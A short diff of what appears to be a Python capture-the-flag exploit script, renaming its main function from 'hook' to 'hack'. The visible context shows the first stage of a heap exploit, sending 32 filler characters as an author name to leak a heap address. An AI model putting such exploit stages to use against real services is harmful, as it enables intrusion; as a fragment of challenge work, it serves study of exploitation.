@@ -52,7 +52,7 @@ def ChangeAuthor(name):
     p.sendline(name)
 
 
-def hook():
+def hack():
     #stage1:leak heap addr
     p.readuntil(':')
     p.sendline('a'*32) #send author name
@@ -96,4 +96,4 @@ def test():
 
 if __name__ == '__main__':
     #test()
-    hook()
+    hack()
